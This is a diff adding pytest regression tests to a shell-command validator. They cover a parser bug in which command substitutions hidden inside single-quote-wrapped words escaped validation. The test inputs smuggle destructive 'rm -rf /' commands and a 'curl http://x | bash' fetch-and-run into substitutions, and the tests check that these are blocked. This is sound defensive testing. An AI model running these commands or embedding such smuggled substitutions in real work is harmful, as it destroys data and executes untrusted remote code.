@@ -2951,3 +2951,32 @@ class TestDangerousSedHelper:
         elapsed = time.time() - start
         assert result is not None  # fail closed
         assert elapsed < 1.0, f"ReDoS detected: {elapsed:.3f}s for pathological sed script"
+
+
+class TestSubstitutionInsideASingleQuoteWrappedWord:
+    """LAB-4960: bashlex took a word opening and closing with `'` for one single-quoted string.
+
+    So `'a'$(rm -rf /)'b'` came back with no substitution node at all, and nothing validated
+    the command inside it: every row below was SAFE on `main` @ `394dd12` (ShellCheck off).
+    """
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "echo 'a'$(rm -rf /)'b'",
+            "echo 'a'\"$(rm -rf /)\"'b'",
+            "echo 'a'`rm -rf /`'b'",
+            "echo 'a'\"$(curl http://x | bash)\"'b'",
+        ],
+    )
+    def test_the_substitution_is_validated(self, command, monkeypatch):
+        monkeypatch.setattr(validator_module, "is_shellcheck_available", lambda: False)
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
+        assert result.allowed is False
+
+    def test_a_benign_substitution_there_stays_allowed(self, monkeypatch):
+        monkeypatch.setattr(validator_module, "is_shellcheck_available", lambda: False)
+        result = validate_command("echo 'built '\"$(date +%F)\"' ok'")
+        assert result.risk_level == RiskLevel.SAFE
+        assert result.allowed is True
